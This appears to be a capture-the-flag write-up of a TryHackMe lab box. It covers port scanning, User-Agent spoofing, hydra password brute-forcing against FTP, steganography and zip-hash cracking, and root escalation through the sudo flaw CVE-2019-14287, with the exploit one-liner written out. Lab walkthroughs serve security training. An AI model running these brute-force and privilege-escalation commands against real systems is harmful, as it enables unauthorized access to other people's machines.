### IP `10.10.59.244`

### 1. Scanning

```
nmap -Pn -A 10.10.59.244  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-12 15:14 EST
Nmap scan report for 10.10.59.244
Host is up (0.23s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
|_  256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Annoucement
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

There are 3 ports: 21,22,80

On the webpage, there is a note saying to change `User-Agent` ito agent's codename in order to see a website, so here comes Burp.
                                                                         
I change browser's data in `User-Agent` section to `C` and get to a website:

```
Attention ****

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

From,
Agent R 
```

While knowing a username and that there is 21 FTP open and also that password is weak, I run hydra to bruteforce it:


`hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.59.244 ftp`

after few moments I got it:

`[21][ftp] host: 10.10.59.244   login: chris   password: c*****l`
                                                                                        
#### 2. FTP Access and bruteforcing with john

With username and password I logged in ftp and see 3 files:

```
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```

I downloaded all of them to my local machine, checked with `steghide` but no success. I used `binwalk` and it turns out there is a hidden zip file inside cutie.png so I extract it:

```
└─$ binwalk cutie.png -e

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
869           0x365           Zlib compressed data, best compression
34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
34820         0x8804          End of Zip archive, footer length: 22
```

and then zip2john to bruteforce and get a passphrase to extract afterwards

`zip2john 8702.zip > agentjpass.txt`

```
└─$ john agentjpass.txt 

a***n            (8702.zip/To_agentR.txt)
```

Next step is extracting that file:

`7z e 8702.zip`

to get another note:

```
└─$ cat To_agentR.txt      
Agent C,

We need to send the picture to 'QX****Ux' as soon as possible!

By,
Agent R
```

#### 3. Decoding found phhrase with Magic and Cyberchef

I pass that word to Cyberchef and Magic which gives me another one:

`Magic from Cyberchef to decode QXJlYTUx --->> A****1`


#### 4. Extracting one of files

Right now I have a passphrase to another file and use steghide to check it:

```
steghide info cute-alien.jpg

"cute-alien.jpg":
  format: jpeg
  capacity: 1.8 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "message.txt":
    size: 181.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

and extract hidden message.txt inside it:
                                                                                                         
```
└─$ steghide extract -sf cute-alien.jpg
Enter passphrase: 
wrote extracted data to "message.txt".
```

In the end I can cat a message and get username / password for another user:

```
Hi j***s,

Glad you find this message. Your login password is h********!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```
                                                                                                         
#### 5. SSH to a server and escalation to root         

It is possible to get a user flag now and one done I check user's permissions:                                                                                            

```
~$ sudo -l
Matching Defaults entries for james on agent-sudo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```
but there is nothing, so was curious what version is it to possibly find an exploit:

```
sudo -V
Sudo version 1.8.21p2
Sudoers policy plugin version 1.8.21p2
Sudoers file grammar version 46
Sudoers I/O plugin version 1.8.21p2
```
Quick research gives me `CVE-2019-14287`

If we add a payload in front of sudo, we can get root. 

so here I go:

```
james@agent-sudo:~$ sudo -u \#$((0xffffffff)) /bin/bash
root@agent-sudo:~# id
uid=0(root) gid=1000(james) groups=1000(james)
```

I am root, so now the flag:

```
root@agent-sudo:~# ls /root
root.txt

root@agent-sudo:~# cat /root/root.txt 
To Mr.hacker,

Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 

Your flag is 
b53a******************062

By,
DesKel a.k.a Agent R
```